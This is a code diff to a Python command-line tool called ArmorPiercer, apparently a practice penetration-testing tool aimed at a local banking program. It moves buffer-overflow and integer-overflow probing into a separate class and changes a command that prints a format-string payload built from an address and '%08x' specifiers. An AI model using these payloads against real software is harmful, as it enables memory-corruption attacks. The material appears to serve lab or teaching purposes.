@@ -1,8 +1,8 @@
-from asyncio.subprocess import PIPE
 import re
-from time import sleep
 import click
 import subprocess as sp
+
+import Exploitation.AutomatedPenTest as auto
 
 
 @click.group()
@@ -25,38 +25,8 @@ def automated_attack(process, user_name, bank_account):
         click.echo('incorrect format of the process name -> ' + process +', exiting now!')
         exit()
     
-    confirmed_vulnerabilities = []
-    process_opened = sp.Popen([user_name]
-                        ,executable="./" + process
-                        ,stdin=sp.PIPE
-                        ,stderr=sp.PIPE
-                        ,stdout=sp.PIPE
-                        ,universal_newlines=True
-                        )
-    process_opened.stdin.write("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
-    for lines in iter(process_opened.stdout.readline, b''):
-        print(">>>" + lines.rstrip())
-    if not re.match("Wrong password", process_opened.stdout.read()):
-        click.echo("Buffer overflow failed to gain access to the application, exiting process now!")
-        process_opened.kill()
-        exit(1)
-    confirmed_vulnerabilities.insert(1, "Buffer overflow is confirmed vulnerability")
-
-    process_opened.stdin.write("1231354\n")
-    sleep(3)
-    process_opened.stdin.write("-21476511480\n")
-    if not re.match("Remains", process_opened.stdout.read()):
-        click.echo("Integer overflow failed, exiting process now!")
-        process_opened.kill()
-        exit(1)
-
-    confirmed_vulnerabilities.insert(2, "Integer overflow is confirmed vulnerability")
-
-    process_opened.kill()
-    print("Penetration testing terminated with success")
-
-    for items in confirmed_vulnerabilities:
-        click.echo("\n" + items + " " + u'\u2713')
+    automated_attack = auto.AutomatedPenTest(process, user_name, bank_account)
+    automated_attack.begin_pen_test()
 
 
 @main.command()
@@ -70,19 +40,19 @@ def buffer_overflow(count = 0):
 
 @main.command()
 @click.option('--int-number',
-                help="Number to cause integer overflow. Max value of int in C is 2147483648")
-def integer_overflow(int_number):
+                help="Number to cause integer overflow. Max value of int in C is +/- 2147483648")
+def integer_overflow(int_number=-21474836100):
     """Command to perform integer overflow
         eg. python3 ArmorPiercer.py integer-overflow --int-number=2147483648
     """
-    something = ""
-    print(something)
     click.echo(int(int_number))
 
 @main.command()
-def string_fortmating():
+@click.option('--address',
+                help='Adress on which the string formating error should be performed')
+def string_formating(address = "\xc2\xd8\xff\xff"):
     """Command to perform string formating """
-    print("\xc2\xd8\xff\xff"+"%08x-"*3+"%s")
+    print(address+"%08x-"*3+"%s")
 
 if __name__ == '__main__':
     main()
